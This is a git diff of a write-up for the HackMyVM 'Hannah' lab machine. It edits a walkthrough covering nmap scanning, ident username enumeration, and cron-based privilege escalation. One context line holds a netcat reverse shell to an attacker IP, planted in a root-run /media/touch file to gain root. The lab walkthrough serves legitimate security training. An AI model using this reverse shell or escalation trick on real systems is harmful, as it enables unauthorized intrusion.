@@ -12,6 +12,12 @@
 
 <img src="https://hackmyvm.eu/img/vm/ez.png" alt="Hannah Machine Logo" width="150"/>
 
+### Tools Used
+
+- Hydra
+- ident-user-enum
+- Nmap
+
 #### Machine Writeup
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
@@ -60,7 +66,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 192.168.56.129 ←
 ```
 
-`nmap -Pn -sSV -p- -T5 192.168.56.130`:
+`nmap -Pn -sSV -p- -T5 192.168.56.129`:
 ```
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 07:54 EDT
 Nmap scan report for 192.168.56.129
@@ -84,7 +90,8 @@ Nmap done: 1 IP address (1 host up) scanned in 93.53 seconds
 
 [Pentesting Ident](https://book.hacktricks.xyz/network-services-pentesting/113-pentesting-ident)
 
-[**#Ident-user-enum**](https://github.com/pentestmonkey/ident-user-enum) is a simple PERL script to query the ident service (113/TCP) in order to determine the owner of the process listening on each TCP port of a target system. The list of usernames gathered can be used for password guessing attacks on other network services. It can be installed with `apt install ident-user-enum`.
+[**#Ident-user-enum**](https://github.com/pentestmonkey/ident-user-enum)
+Is a simple PERL script to query the ident service (113/TCP) in order to determine the owner of the process listening on each TCP port of a target system. The list of usernames gathered can be used for password guessing attacks on other network services. It can be installed with `apt install ident-user-enum`.
 ```
 root@kali:/opt/local/recon/192.168.1.100# ident-user-enum 192.168.1.100 22 113 139 445
 ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )
@@ -155,6 +162,7 @@ Codename:       bullseye
 ```
 
 `cd /home/moksha`
+
 `ls -alps ./`:
 ```
 total 32
@@ -215,7 +223,6 @@ Disallow: /enlightenment ←
 [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
 
 [**#Scheduled/Cron jobs**]
-
 Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
 ```
 crontab -l
@@ -264,6 +271,7 @@ drwxrwxrwx 3 root root 4096 ene  4  2023 /media ←
 ```
 nc -c '/usr/bin/bash' 192.168.56.118 4444 ←
 ```
+
 `chmod +x /media/touch`
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
@@ -292,6 +300,7 @@ uid=0(root) gid=0(root) grupos=0(root) ←
 ```
 
 `cd /root`
+
 `ls -alps`:
 ```
 total 28
